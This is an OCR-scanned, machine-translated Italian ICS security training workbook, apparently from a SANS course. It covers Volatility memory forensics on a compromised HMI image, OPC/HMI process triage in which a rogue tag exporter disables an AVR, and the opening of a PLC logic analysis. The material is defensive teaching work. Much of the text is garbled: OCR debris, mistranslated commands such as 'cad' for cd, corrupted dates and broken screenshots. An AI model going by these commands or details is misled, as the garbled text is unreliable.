tempo. Ad esempio, Didier Stevens ha aggiunto la possibilità di utilizzare i file YARA contro i PDF in pdf-parser per rilevare
comportamento dannoso. L’importante non è sapere cosa sia ogni strumento o comando, ma capirlo
attraverso l'acquisizione del vettore di attacco iniziale (come un PDF), la creazione di un ambiente di lavoro sicuro (come
RELICS) e cercando strumenti di analisi manuale (come pdf-parser), diventa rapidamente possibile familiarizzare
scoprire l'aspetto dei file buoni e dannosi e sviluppare una maggiore comprensione degli strumenti
disponibile. Questo processo aiuta anche a identificare il motivo di alcuni piccoli meccanismi di difesa, come la disabilitazione
JavaScript nei lettori PDF di tutta l'organizzazione può contribuire notevolmente alla sicurezza. Questa comprensione
può essere condiviso all'interno di un'organizzazione allo scopo di formare gli utenti e ottenere una migliore adesione
pratiche di sicurezza.

© 2021, Robert M. Lee Lab 4.3-8

@) io mio) @ ® @)

@ @ Rif,

eh

fe

ohm
ahi

}

an ap’ aa) Th

a «a «a «> dn «4p dp op

UN,

Lab 4.4 - Analisi forense della memoria HMI _

e — Acquisire familiarità con la volatilità
e Sfruttare le tecniche forensi di memoria per estrarre informazioni chiave a supporto della risposta agli incidenti

*Informazioni sullo scenario* A questo punto siamo già a conoscenza del compromesso nella raffineria di Calistoga.Inoltre, abbiamo visto che l’avversario si è spostato lateralmente attraverso l’ambiente dall’IT all’OT
reti e probabilmente ha compromesso l'Engineering Workstation (EWS) e l'interfaccia uomo-macchina
(HMI). In base all'analisi della rete abbiamo riscontrato che i seguenti file venivano spostati sulla rete:

- FTActivationBoost.exe
-RSLinx.exe

- Curriculum vitae.doc

- Flexsvr.exe

-Beacon.exe

Sappiamo anche che l'EWS è stato utilizzato per interagire con il controllore di sicurezza, probabilmente utilizzando un file di progetto infetto.
Tuttavia, non sappiamo se sia stato fatto qualcosa sull'HMI. Anche se abbiamo visto l'avversario tentare di interagire
it e comunicazioni coerenti non sappiamo se i file a cui si fa riferimento sopra o altri fossero corretti
eseguito sul sistema. L'immagine della memoria dell'HMI può essere analizzata per identificare se qualcuno dei programmi lo era
eseguito e se sono presenti ulteriori informazioni che possano aiutare con la nostra indagine.

*Nota* Se ricevi un errore con Volatility, prova a connettere la tua VM a Internet ed eseguire il comando
Ancora; poiché è un artefatto della VM, a volte è necessario un aggiornamento della volatilità

Questo esercizio utilizzerà la VM RELICS e il file viewdesigner_memdump .mem in ics515 >
calistogarefinery > cartella della memoria sul desktop. Dovresti utilizzare Volatilità per completare questo lab.

© 2021, Robert M. Lee Lab 4.4-1
1. Dei file dannosi osservati nel traffico di rete (ad esempio FTActivationBoost.exe, RSLinx.exe, Flexsvr.exe,
Beacon.exe e Resume.doc) quali sono stati eventualmente eseguiti sul sistema?

2. Uno dei processi viene utilizzato per consentire all'avversario di apportare modifiche a un altro processo e modificare il file
software di licenza, quale processo esegue questa operazione?

3. Quali due processi dannosi ascoltano le comunicazioni di rete?

4. Quando esattamente è stato eseguito beacon.exe?

© 2021, Robert M. Lee Lab 4.4-2

qe) fe @@) qe) @) @) oe, noi, oy @, ey

RF,

«eB.»
4s come 1s 4B è’ a8 è’

COME

Compito: Familiarizzazione con la memoria di base

1. Dei file dannosi osservati nel traffico di rete (ad esempio FTActivationBoost.exe, RSLinx.exe, Flexsvr.exe,
Beacon.exe e Resume.doc) quali sono stati eventualmente eseguiti sul sistema?

FTActivationBoost.exe

Flexsvr.exe

beacon.exe

> Avvia la tua VM RELICS

> Accedi alla VM
> ACCEDI =reliquie
> PASSWORD = reliquie

> Passa alla cartella della memoria della raffineria di Calistoga
> Apri un terminale
> Eseguire il seguente comando nel terminale:
cad /home/reliquie/Desktop/ics515/calistogarefinery/memoria/

ineria/memoria/

> Utilizza Volatilità per identificare i processi in esecuzione sul sistema Windows
> Eseguire il seguente comando nel terminale:
sudo vol -f viewdesigner _memdump.mem windows.pslist
> Identificare eventuali processi sospetti, in particolare quelli corrispondenti ai file dannosi

© 2021, Robert M. Lee Lab 4.4-3
Fa
Falso

wo
P=

nd
Ora ob

o

_N

cmd.exe Bue 7 1
conhost.ex ©x85591cd8
cmd.exe 0x

conhost.exe

Protocollo di ricerca
SearchFilterHo

FIK Imager.exe

ANN GG

>1D
ress

NNNN O
Boe

-2N

UN

4
2
1

ND

EventClientMul

conhost.exe
imgrd.exe

x86a8a490
ab5d20
Ox86ace030

*Nota* I processi cmd.exe riguardano l'esecuzione della riga di comando e l'interazione con il sistema, non
anomalo in tutti i casi ma sicuramente interessante su un sistema potenzialmente compromesso. Questo ci indica lì

è utile nell'analizzare le informazioni memorizzate nella riga di comando in memoria, ma lo esamineremo tra poco
morso.

*Nota* Analizzando i processi in esecuzione troviamo FTActivationBo (abbreviato da FTActivationBoost.exe),
beacon.exe e flexsvr.exe. Vediamo RSLinxNG.exe ma è diverso da RSLinx.exe, quindi potremmo analizzarlo

certo, ma non lo considererei immediatamente dannoso.
*Risposta* FTActivationboost.exe, Flexsvr.exe e beacon.exe
2. Uno dei processi viene utilizzato per consentire all'avversario di apportare modifiche a un altro processo e modificare il file

software di licenza, quale processo esegue questa operazione?
flexsvr.exe

*Nota* In genere è comunque utile controllare se è stato fatto qualcosa sulla riga di comando, ma lo sappiamo
erano in esecuzione più istanze di cmd.exe, quindi è sicuramente un'ottima scelta. Il plugin cmdline di Volatility eseguirà il pull

esaurisci la memoria di tutto ciò che è stato fatto di recente tramite la riga di comando e stampalo.

© 2021, Robert M. Lee Lab 4.4-4

®)

ey, @) cm) qe) qe) qm) qe) q@) qe) ce) (ey) ee) «ey

ohm)
45 ‘iB aa ap) “py ap” <p <p’ <p ip _p

<B

ap av ap 4p ar 45 4B 4B 4B

ap

> Utilizza Volatilità per identificare l'output della riga di comando sul sistema Windows
> Eseguire il seguente comando nel terminale:
sudo vol -f viewdesigner_memdump.mem windows.cmdline
> Identificare qualsiasi attività sospetta

S$ sudo vol -f viewdesigner_memdump.mem windows.cmdLline
Volatilità 3 Quadro 1.0.1

Avanzamento: 100.00 Scansione PDB terminata
PID Pr

ss uscito?)

Helper\U

*Nota* Vediamo il comando RSLingNG.exe ma nulla di veramente evidente. Vediamo anche dove

FTActivationBoost.exe è stato eseguito ma nessun altro comando. Tuttavia, flexsvr.exe viene eseguito e vediamo che l'avversario
lo stava usando per eseguire comandi, in questo caso sembra il dongle e il server della chiave di licenza Rockwell Automation

sono stati modificati per qualche motivo sconosciuto con un'interazione con Imgrd.exe.

*Nota* In questa fase non arriveremo ad alcuna conclusione completa, ma questo è un altro processo che noi

potrebbe catturare la memoria o i file eseguibili ad essa associati affinché gli analisti di malware possano dare un'occhiata.

© 2021, Robert M. Lee

Laboratorio 4.4-—5
3. Quali due processi dannosi ascoltano le comunicazioni di rete?
Imgrd.exe

flexsvr.exe
*Nota* È utile sapere non solo cosa è in esecuzione sul sistema e quali interazioni hanno avuto luogo, ma anche se
ci sono eventuali comunicazioni di rete a cui prestare attenzione. Il plugin netscan di Volatility aiuta
identificare comunicazioni aperte verso sistemi/processi esterni e locali.

> Utilizzare Volatilità per identificare eventuali comunicazioni di rete interessanti

> Eseguire il seguente comando nel terminale:
sudo vol -f£ viewdesigner_memdump.mem windows.netscan

> Identificare qualsiasi attività sospetta

È sudo vol -f viewdesigner_memdump.mem windows .netscan
Volatilità 3 Quadro 1.0.1
stampa: 100.00 Scansione PDB terminata
Proto LocalAddr LocalPort ForeignAddr

*Nota* È interessante notare che non vediamo alcuna comunicazione con altri indirizzi IP come i controller di sicurezza
con cui sappiamo che l'HMI sta interagendo. Ciò potrebbe indicare che il sistema è stato disconnesso da
rete prima che il dump della memoria fosse creato o con cui si interagisse in altro modo invece di prendere semplicemente il file
discarica della memoria. Ciò potrebbe comportare un cambiamento del processo per i nostri soccorritori per garantire di preservare il maggior numero di attività forensi

dati possibili.

*Nota* Mentre esamini le comunicazioni dovresti essere in grado di vedere che Imgrd.exe e flexsvr.exe hanno
aprire le porte TCP rispettivamente su 27000 e 49170 in ascolto. Questi potrebbero rappresentare le porte che l'avversario può
connettersi quando si desidera per interagire con il sistema. Questa è un'ulteriore prova che questi due processi sono l'uno per l'altro
principali artefatti forensi su questo sistema che dobbiamo segnalare anche ai nostri analisti di malware. Focalizzando il
l'indagine su centinaia di migliaia di artefatti digitali o solo su pochi rappresenta un importante valore aggiunto.

© 2021, Robert M. Lee Lab 4.4-6

cB) @) ey ®

Pf. a noi, @, oe, ne, noi, ae

ce.

;
iw

ww ww ww ww

w

su 45 45 45 a5

a5

COME

COME

4. Quando esattamente è stato eseguito beacon.exe?
2020-09-09 17:36:38 ora locale

*Nota* Il plug-in timeliner di Volatility eseguirà tutti i plug-in in Volatility che dispongono di informazioni sui tempi e put
loro in ordine cronologico. L'ora si basa sull'ora del sistema locale, ma questo è un ottimo modo per la maggior parte dei casi
azioni intraprese dall'avversario sul sistema e trovare informazioni rilevanti. Inoltre, avere i tempi
informazioni, ad esempio quando sono stati eseguiti gli eseguibili o i comandi, aiutano a focalizzare l'indagine non solo su
memoria ma anche log e traffico di rete relativi all'incidente complessivo.

> Utilizza Volatilità per identificare la sequenza temporale dell'attività e quando è stato utilizzato beacon.exe
> Eseguire il seguente comando nel terminale:
sudo vol -f viewdesigner_memdump.mem timeliner.Timeliner > test.txt
> Passare a text.txt (archiviato nella cartella di memoria sotto la cartella della raffineria di Calistoga)
>Apri il file
> Cerca beacon.exe con Ctrl-F

er_memdump.mem timeliner.Timeliner > test.txt

170 DLLList Caricamento DLL: processo 4812 svchost.exe caricato CLBCatQ.DLL (C:\Windows\system32\CLBCatQ.DLL)

171 Caricamento DLL DLULList: processo 1148 svchost.exe caricato SensApi.d1l (C:\Windows\system32\SensApi.dlL)

172 DLLList Caricamento DLL: processo 1148 svchost.exe Caricato rasadhlp.d1l (C:\Windows\system32\rasadhip.d1ll
173 DLLList Caricamento DLL: processo 2760 explorer.exe caricato imagehlp.d1l (C:\Windows\system32\imagehlp.dl
174 Processo PsList: 5976 beaconmac (2257938032) 09-09-2020 17:36:38.000000 N/A N/A N/A

175 Processo PsList: 5976 beacon.exe (2257938032) 2020-69-09 17:36:38.000000 N/A N/A N/A

176 DLLList Caricamento DLL: Processo 896 svchost.exe Caricato pcasvc.dll (c:\windows\system32\pcasvc.d11) Dimensioni
177 DLLList Caricamento DLL: Processo 896 svchost.exe Caricato AEPIC.d11l (c:\windows\system32\AEPIC.d11L) Dimensioni

178 DLLList Caricamento DLL: Processo 896 svchost.exe Caricato sfc.d1l (c:\windows\system32\sfc.d1l) Dimensione 1228
179 DLLList Caricamento DLL: Processo 896 svchost.exe Caricato sfc_os.DLL (c:\windows\system32\sfc_os.DLL) Dimensioni
180 DLLList Caricamento DLL: Processo 896 svchost.exe Caricato VERSION.d1Ll (c:\windows\system32\VERSION.d1L) Si
181 DLLList Caricamento DLL: processo 896 svchost.exe Caricato wevtapi.dll (c:\windows\system32\wevtapi.dlL) si
182 DLLList Caricamento DLL: Processo 2760 explorer.exe Caricato DEVRTL.dll (C:\Windows\system32\DEVRTL.dlL) Si
183 DLLList Caricamento DLL: Processo 5976 beacon.exe Caricato kernel32.d1l (C:\Windows\system32\kernel32.d11)
184 DLLList Caricamento DLL: processo 5976 beacon.exe caricato KERNELBASE.d11 (C:\Windows\system32\KERNELBASE.
185 DLLList Caricamento DLL: Processo 5976 beacon.exe Caricato msvcrt.dll (C:\Windows\system32\msvert.d1ll) Dimensioni

*Risposta* Mentre cerchi la prima istanza di beacon.exe scoprirai che è stata eseguita il 2020-09-09 17:36:38
ora locale.L'analisi forense della memoria è una potente capacità di dover rivedere quali azioni sono state intraprese su un sistema come
quali file erano in esecuzione, interazioni di rete a livello di sistema e creazione di sequenze temporali dell'attività dell'avversario.
Anche l'immagine della memoria in questo scenario, che non era pieno di dati forensi, è stata utile per aiutare
identificare quali file sono stati eseguiti con successo sul sistema contribuendo a restringere l'ambito dell'indagine
e comprendere più a fondo l'incidente e le future raccomandazioni sulla sicurezza.

© 2021, Robert M. Lee Lab 4.4-—7
45 noi 8 WwW Ww Ww Ww

a5

_ Lab 4.5 - Triage dei processi —

Obiettivi

e —_ Determina cosa sta succedendo visualizzando i dati di processo e i comandi del sistema di controllo

*Informazioni sullo scenario* C3PO ha ripristinato le proprie operazioni e le procedure di risposta agli incidenti sono in gran parte state ripristinate
completato. L'organizzazione torna alle normali operazioni e decide di voler lavorare più da vicino
esaminare le tendenze del processo rispetto all’attività corrente. L'operatore decide di utilizzare maggiormente lo Historian
strettamente e Matrikon per la sua capacità di raccogliere informazioni tramite OPC.

I sistemi di controllo possono presentare normali problemi di processo a causa di apparecchiature difettose o dispositivi configurati in modo errato
o errore umano. Comportamenti anomali del sistema di controllo possono anche costituire segni premonitori di attività avversarie
sistemi di controllo o un vero e proprio attacco al processo. Osservare queste attività attraverso la prospettiva di
le operazioni possono portare a una collaborazione e comunicazione anticipata tra le operazioni e i team di sicurezza
durante la scoperta e il triage di un evento.

Preparazione agli esercizi

Questo laboratorio utilizzerà la VM Windows, RELICS con OpenPLC in esecuzione e il kit PLC

1. In che modo uno storico è utile quando si esegue un triage di una questione all’interno di un processo?

2. Come possono apparire alcune attività di minaccia informatica al personale operativo?

Compito: osservare le normali operazioni

3. In che modo uno storico è utile quando si esegue un triage di un problema all'interno di un processo?
Domanda a risposta a perta

*Nota* Per ottenere gli stessi risultati mostrati in questa cartella di lavoro, assicurarsi che il sistema sia in esecuzione con quanto segue
impostare.

> Configura il server OPC
> Avviare il server MatrikonOPC per Modbus.
> Selezionare File e quindi importare il file di configurazione da
Desktop\ics515\'ICS515_Matrikon_Config.xml.

© 2021, Robert M. Lee Lab 4.5-1
@ importa configurazione
|) > Questo PC > Desktop > File degli studenti - o Cerca file degli studenti

Organizza ~ Nuova cartella
Wi Desktop 9 * Nome “ Data di modifica Tipo
} Download 5 [3) 15515 Matrikon Config 02/07/2021 15:50 File XML
{Bj Documenti n. (2) ICS515_ Matrikon Explorer Config TIS/2021 10:11 File XM
(=) Immagini n.
1) 30-07-2021
"aggiuntivo
|| MAllarmi
©) File degli studenti
@®OneDrive
IT Questo PC
Oggetti B30

Nome del file: | iC$515_Matrikon_Config

> Quando richiesto, selezionare NO per esportare per un uso successivo

@® Guida alla finestra di modifica della visualizzazione dei file
Q guai = © BH | |B [Seinewniode - HK dete

MyMatrikonOPC » Locaihost + MatrikonOPC Server per Modbus » Configurazione ServerNodes >

" |Conferma iC

Stai per sostituire la configurazione attualmente attiva.
Vuoi esportarlo per un uso successivo prima di procedere?

Laboratorio 4.5-2

© 2021, Robert M. Lee

=) = 2.

e

PS | eee | ee |Vedi ee |e eS le tariffa | nemico |

eo

ee®®

® ®@ ®

BR®

oe B

ki

?

(e ss
wo wa © w©w wD WwW Ww WwW WwW W

Davvero, OY

A

a, come '4B' <BR'

ap

iy Server MatrikonOPC per Modbus - [Localhost\MatrikonOPC Server per Modbus\ServerConfigControl]

®, Guida della finestra di modifica della visualizzazione dei file

i €]) Indietro ~ () ~ St *y | (2) Spe Nuovo nodo > © Elimina
Posizione: MyMatrikonOPC » Localhost » MatrikonOPCServerforModbus » Configurazione ServerNodes »
a-@ MyMatrikonOPC
un host locale '3
= Server Zt MatrikonOPC per Modbus

& Configurazione dei nodi B erver

IB Clickplc
Configurazione automatica IB Openpic!

i (8) Opzioni avanzate

> Per evitare lacune nei trend, avviare Matrikon OPC Explorer dal menu Start
io. In alternativa: accedere a C:\Programmi
(x86)\Matrikon\OPC\Explorer\OPCExplorer.exe
> Eseguire MatrikonOPC Explorer

*Nota* Matrikon OPC Explorer è un pacchetto client OPC generalmente utilizzato per la risoluzione dei problemi.

> Selezionare File e aprire la configurazione ICS515_Matrikon_Explorer_Config.xml

Elemento gruppo file server Visualizza la Guida

Rt Sole @ ha Plo Bw e

Host locale '\\SANSICS-WIN'

ve v iy Host locale '\\SANSICS-WIN'
'SRE Matrikon.OPC.Modbus. 1
GE Matrikon. OPC. Simulazione. 1

'DI RSLinx OPC Server

Server OPC remoto biG RSLinx

Quartiere di rete
Altri computer di rete

@ Sessione aperta

- ~ p > QuestoPC » Desktop > File degli studenti

Organizza + Nuova cartella

*~ Nome

sk Accesso rapido
Desktop n.
4} Download n.

(| 1CS515_Matrikon_Config
() 1CS515_Matrikon_Explorer_Config

> Verifica che gli elementi visualizzati abbiano valori e che la colonna "Stato" mostri Attivo.

© 2021, Robert M. Lee Lab 4.5-3
>

.-—— saccms=s |
ID elemento Valore AccessPath Qualità Timestamp Stato
{8 Clickplc.... Vero bene, non... 16/07/202... Attivo
{1 Clickplc.... Vero bene, non... 16/07/202... Attivo
(i Clickplc.... Vero bene, non... 16/07/202.... Attivo
ft} Clickplc.... Vero bene,non... 16/07/202... Attivo
(> Clickplc.... Vero bene,non... O7/16/202... Attivo
(> Cliccaplc....120 Buono,non... 16/07/202... Attivo
G2} Clickplc.... 80 Buono, non... 16/07/202... Attivo
> Clickplc.... 80 Buono, non... 16/07/202... Attivo
i Openpic... 30 Buono, non... 16/07/202... Attivo

tl {%} Openplc... 30 Buono, non... 16/07/202... Attivo

Imposta l'alimentazione residenziale.

> Nell'HMI, aprire la schermata "Residenziale".
> Se in alto a destra è presente il pulsante "Reimposta allarme", fare clic su di esso per reimpostare l'allarme.

> "Chiudere" la richiusura.

*Nota* Un quadrato ROSSO indica chiuso indipendentemente dai colori della linea

Principale

>

Trasmissione

Generazione |g Distribuzione

Residenziale

Industriale

Strada della Casa sul Lago

Allarmi

Richiusura

Domanda attuale

Imposta la potenza industriale
> Apri la schermata "Industriale".
> Se in alto a destra è presente il pulsante "Reimposta allarme", fare clic su di esso per reimpostare l'allarme
> "Chiudere" l'interruttore
> Assicurati che entrambe le raffinerie siano spente

© 2021, Robert M. Lee

Strada del Lago Piacevole

Aperto chiuso

Carico massimo

15/07/2021

Accesso alle tendenze 14:36:39

Lab4.5-4

MW

Mw

@

?
Zp

ty

a5 <5 <5 <5 <5

COME

ap

Trasmissione
e distribuzione

Generazione residenziale industriale

7130/2021

Tendenze 20:40:31

Prelievo MW della raffineria

Uscita corrente

Max Mi

> Configurazione dei sistemi di trasmissione e distribuzione

>

Apri la schermata "Trasmissione e distribuzione".

> Se in alto a destra è presente il pulsante "Reimposta allarme", fare clic su di esso per reimpostare l'allarme

>

Generazione
280 MW

Consumo di MW

10%

Chiudi la generazione di intertie

Generazione residenziale industriale

Trasmissione e distribuzione

JL

Lamda
Casa del potere
TRASFERIMENTO AUTOBUS

Lambda
Trasmissione

Protezione
Relè e
& _

Lamda
Sottostazione

15/07/2021
Tendenze 15:13
|
Intercettazione
Generazione

forno |

Guasto | |

© 2021, Robert M. Lee

Lamda
Che | Trasmissione
Interruttore /

| Consumo di MW

MW

> Configurare il sistema di generazione
> Aprire la schermata "Generazione".

> Se in alto a destra è presente il pulsante "Reimposta allarme", fare clic su di esso per reimpostare l'allarme
> Impostare i "Comandi valvola carburante CT" su "Modalità automatica" e "OpenPLC"
> "Avviare" la turbina a combustione e attivare "AVR On"
> Chiudere l'interruttore di generazione
"Ganeration ee Accesso industriale residenziale sti iahe ath
La valvola del carburante CT controlla lo stato di interblocco della generazione
acqua
@ Modalità automatica | Permessi dell'interruttore
, © Locale Fare clic su PLC @ Generatore in funzione
30% Aperto @ OpenPLe @ Trans. Interruttore chiuso
cioè @ Trans. Relè di protezione
oes Modalità Warsi @ Carica presente
Setpoint di controllo del controllo
CliccaPLC |» Manuale | 80 || % Aprire

Turbina a vapore

Aria in ingresso

Turbina a combustione

@CTRunning @ AVR On = mia Potenza Potenza Potenza
Modalità Esperto ©/CT Arrestato © Modalità Manuale Attiva Generazione Consumo Disponibile
Sull'uso PB | _votage Manuale Industriale 30 MW Locale 80 MW Locale | 280
OF = Reo Stat Residenziale 50) MW Intertie 0 MW Intertie [500
su Tota [80 | mw Totale [80 | mw Totale [70

> Revisione dell'andamento del funzionamento stabile
> Aprire la schermata "Trend" > "Generazione".

*Nota* Dovrebbe essere simile al seguente ma potrebbe non essere identico

Open PLC è attivo e funzionante nella VM.

© 2021, Robert M. Lee Lab 4.5-6

MW
MW
MW

ohm

@ce,

eh
“5 te 45 as 45 as Ae wy aw

43

a5

>

Residenziale Industriale

Togliere l'elettricità residenziale.

azione Relè

CT in esecuzione

Potenza (MW)
IB temperatura dell'aria nulla (F)
Setpoint BB (Mw)

La tubercolosi ha mangiato
Setpoint BBE @%

> Dalla scheda del kit studentesco ruotare il quadrante del carico residenziale fino in fondo e poi fino in fondo

su

> Dovrebbe esserci un chiaro calo di “Produzione (MW) e “Posizione valvola (%)” e un relativo calo

aumentare in concomitanza con l'aumento del carico

© 2021, Robert M. Lee

Laboratorio 4.5-7
> Esaminare i valori di generazione

> Aprire la schermata "Generazione" e annotare le modifiche alla posizione e all'uscita della valvola, ma in caso contrario

tutto è come prima.

*Nota* Questi sistemi sono costruiti per svolgere molte funzioni operative ma abbiamo appena assistito ad una vera e propria
funzionamento di una delle relazioni funzionali tra il sistema fisico (Valvola di Controllo del Carburante e Combustione

15/07/2024

Interruttore del generatore

Trasmissione Bre

= Relè di protezione

CT in esecuzione

AVR attivato

Potenza (MW)
Temperatura dell'aria in ingresso (F)

Punto di riferimento (MW)

Posizione della valvola (%)

Punto di riferimento (%)

turbina) nonché il sistema di controllo (interoperabilità di PLC, HMI e OPC).

*Risposta 1* Uno storico, registra l'attività passata del comportamento, dei permissivi e degli stati del sistema fisico. Questo
consente alle operazioni di confrontare il comportamento attuale del processo con il comportamento storico. È tipico di uno storico

da configurare solo per monitorare i punti dati chiave e critici del sistema, ma solitamente non tutti i punti dati.

© 2021, Robert M. Lee

Laboratorio 4.5-8

<-a

°o

=

fe

o

fe

fe

>

=

bd

>

>

>

>

>

>

UN
wa Ww WwW

noi Ww

wow, noi, Ww

45 ae «4 w G noi ww Ww G w ww

45

Compito: identificare i problemi del processo

> Con tutto funzionante come prima, “Esportare” i Tag dal server OPC
> Aprire la schermata Tendenza generazione
> Eseguire l'applicazione di esportazione dei tag OPC

Una nota

UN

è l'esportatore di tag OPC

> Attendi circa un minuto e fai clic su "OK" per cancellare la finestra del messaggio di errore

Esportatore OPC

Errore programma {codice: 0443243)

*Nota* Un errore come questo potrebbe far riflettere un professionista della sicurezza, ma questi tipi di errori possono verificarsi ovunque
il tempo e non avviserebbe la maggior parte degli operatori di qualsiasi cosa anomala.

> Togliere l'elettricità residenziale

> Regolare il carico residenziale manipolando i quadranti su e giù e osservare nuovamente l'effetto

> Dal kit studente, premi il pulsante di chiusura residenziale Apri PB, quindi sposta l'interruttore della sim 6 per cancellare
l'allarme e poi premere il pulsante di richiusura Chiudi PB.

> Osservare l'andamento della generazione in risposta alla perdita di carico rispetto alla risposta all'operazione di richiusura
mostra una drammatica differenza nel comportamento delle tendenze ora rispetto a prima rispetto alla “produzione”.
(MW) e "Posizione valvola (%)". Inoltre, se accedi alla schermata di generazione, lo farai
vedere che anche l'AVR si è spento

© 2021, Robert M. Lee Lab 4.5-9
15/07/2021
13:00

<a

Interruttore del generatore

Interruttore di trasmissione

| Relè di protezione

> Tentare di risolvere il problema
> Aprire la schermata "Generazione".
> Fare clic sul pulsante AVR per riattivare l'AVR

@ CT in esecuzione CG AVR attivato

Modalità esperto
Sim8

On = Usa Inizio | di PB Voltaggio

Spento=Stati auto —| Regolamento

CT in esecuzione
AVR attivato

Potenza (MW)
Temperatura dell'aria in ingresso (F)
Setpoint (MVV)

Posizione della valvola (%)

Punto di riferimento (%)

CCT interrotto © Modalità manuale attivata

Manuale
Modalità
Punto di riferimento

280

(ehi

ef @

eh

@

*Nota* Dal punto di vista dell'operatore e degli ingegneri, questo non ha senso. La funzione da abilitare
la modalità manuale, in generale, viene eseguita da un essere umano, non dalla logica del controller. L'uso della modalità manuale no
di solito si tratta di un'attività regolare, quindi con questo, il team operativo può riflettere su diverse possibilità, come ad esempio:

© 2021, Robert M. Lee Lab 4.5-10
ww

a5 45 a asey w a

45

45 45 a

COME

e Il controller risponde correttamente?

e Sono state apportate modifiche al sistema?
e La comunicazione funziona correttamente?

e È effettivamente in modalità manuale?

e Qual è la causa principale di questo problema?

> Mentre un team sta indagando sul problema dell'AVR, è tempo di riapplicare l'elettricità residenziale
> Ritornare alla schermata "Residenziale".
> "Reimposta allarme"
> "Chiudere" la richiusura

Ripristina
Allarmi

Domanda attuale 0 MW

Richiusura

Strada della Casa sul Lago

io

Aperto chiuso

Carico massimo 100 MW

Lago Piacevole R

> Ritorna all'AVR

> Ritornare alla schermata "Generazione".

> Tentare di riaccendere l'AVR. A seconda dello stato del pulsante potrebbero essere necessari un paio di clic
da eseguire

io. Alla fine il pulsante "Regolazione della tensione" dovrebbe leggere "Manuale" e la spia "AVR acceso".
dovrebbe essere un verde fisso

> Ripetere la procedura per vedere se c'è una coincidenza tra l'apertura della chiusura residenziale

e il sistema AVR.

*Nota* In un ICS possono verificarsi coincidenze, ma alla fine le operazioni rimarrebbero normalmente in sospeso quando
i problemi si risolvono magicamente da soli senza una spiegazione chiara e dimostrabile. In alcuni sistemi, o il sistema
operativo è in uno stato particolare (ad esempio spento), il team operativo potrebbe essere in grado di manipolare il sistema per farlo
esplorare ulteriormente questi problemi e coincidenze. Molte volte, però, quel lusso non esiste
manipolare il sistema può essere indesiderabile e avere un impatto negativo sull’azienda. Non in tutti i casi, ma in questo
Ad esempio, non ci sono stati errori operativi o bug tipici per spiegare cosa è successo. Dal fisico
Dal punto di vista operativo, il risultato dello spegnimento dell'AVR creerebbe tuttavia una condizione operativa manuale
per l'operatore di generazione che richiede comunicazioni di controllo del set point con il proprio operatore di trasmissione o
autorità di bilanciamento fino alla risoluzione della questione. L'indisponibilità prolungata può influire sulla decisione operativa
fare riguardo agli impegni unitari e alle offerte sul mercato.

*Risposta 2* Le attività di minaccia informatica possono sembrare subdole, ma gli impatti fisici e aziendali,
associati a tali sottotitoli possono avere impatti più devastanti. Come difensori che si appoggiano alle nostre operazioni
team come occhi e orecchie per le prime indicazioni di eventi informatici, con la consapevolezza di come vederli
I sistemi potrebbero essere fondamentali per comprendere le intenzioni di una minaccia.

© 2021, Robert M. Lee Lab 4.5-11
Compito: pulizia

> Esaminando i processi in esecuzione all'interno della VM Windows, identifichi opctagexporter in esecuzione e tu
può uccidere il processo

è Opctagexporter 0% 9,7 MB 0 MB/s 0 Mbp:

\4s opctagexporter 0% 0,8 MB 0 MB/s 0 Mbp:

*Nota* Con il processo interrotto, non vedrai più il comportamento strano derivante da una richiusura della distribuzione
influendo sullo stato dell'AVR su un generatore.

Esercizi da asporto

In alcuni casi, la registrazione e le analisi forensi disponibili su un particolare dispositivo ICS potrebbero essere limitate e non sufficienti
utile nella risoluzione dei problemi relativi agli eventi operativi.Sfruttare l'attività operativa della rete, i dati storici, gli allarmi
i dati, la sequenza dei dati degli eventi, l'analisi del processo dell'endpoint e le revisioni dei registri dell'host possono essere tutti utili per determinare
eventi anomali del sistema che spesso vengono semplicemente dichiarati come operazioni errate senza un'analisi completa
eseguito per identificare la vera causa.

© 2021, Robert M. Lee Lab 4.5- 12

(Way

eo®)

om-om
wo do wb OY WY wo wD &

noi Ww

J

B ap ap »

«ps

45)

Lab 5.1 -Analisi logica per l'analisi delle cause profonde _

e Identificare cosa c'era di sbagliato nella logica e ripristinare il sistema in uno stato buono
e Determinare quando la manipolazione logica ha provocato per la prima volta una manipolazione nell'HMI

*Informazioni sullo scenario* L'HMI C3PO è stato bloccato inaspettatamente dopo la modifica della logica dell'OEM al clic
PLC. A prima vista questo non ha senso perché ciò implicherebbe che una modifica del PLC abbia un impatto sull'HMI
negativamente, ma è lo scenario più realistico visti i recenti cambiamenti. Pertanto, dobbiamo analizzare la logica
e i dati di rete disponibili per determinare l'analisi della causa principale.

Preparazione agli esercizi

Questo esercizio utilizzerà la VM Windows e BurnerManagement.L5k e BurnerManagementinfected.L5K
file nella cartella File Studente sul Desktop.

[Domande |

1. Cosa ci dicono i tag sullo scopo del file logico?

2. Qual è la routine dannosa?

3. Cosa sta accadendo nella logica?

© 2021, Robert M. Lee Lab5.1-1
Compito: determinare in quale punto del codice PLC viene comandato l'HMI 5:

1.

Cosa ci dicono i tag sullo scopo del file logico?

Il file logico gestisce le pompe dosatrici e le pompe per il sistema di gestione del bruciatore

> Utilizzando Notepad++ rivedere BurnerManagement.L5K.

> Apri Blocco note++
> Apri BurnerManagement.L5k
> Esaminare il file per acquisire familiarità con esso

[Il nuovo 1 - Blocco note++

File Modifica Cerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui finestra plugin ?
I8HS 8 FAl4 eH Ac noi «|B J
=jnuovo 1 E3|

—————

Durata del file di testo normale: 0 righe: 1

FMI

tn:1 Col:1 Pos: 1

Windows (CRLF) UTF-8 INS

File Modifica Cerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui finestra plugin ?

Nuovo
Aprire...
Apri la cartella contenente
Apri nel visualizzatore predefinito
Apri cartella come area di lavoro...
Ricarica da disco
Salva come...
Salva una copia con nome.
ave A
Rinominare...
Vicino
Chiudi tutto
Chiudi di più
Sposta nel cestino

Carica sessione...
Salva sessione.

Ctri+R

“5

Ctrl+Alt+S

Ctri+Ww
Ctri+Maiusc+W

© 2021, Robert M. Lee

Laboratorio 5.1-2

@,

@

Ce@e@) oe

@

Pe, Pe, oe, aw, ee ae,

eh

?,

(*>
noi © GW © Ww Ww ww &Y Ww WwW WH WO WD WwW WO WD W

a5

File Modifica Cerca Visualizza Codifica Impostazioni lingua Strumenti Macro Esegui finestra plugin ?
| (X Apri x
+ > Questo PC > Desktop > File degli studenti > calistogarefinery v & Pp
Organizza + Nuova cartella ira | (2)
; -ve Nome. Data di modifica Dimensione tipo
 Accesso rapido _ BurnerManagement.L5K _— 01/08/2021 15:41 Logix Designer Im...

: {Pa.desktop
Download +

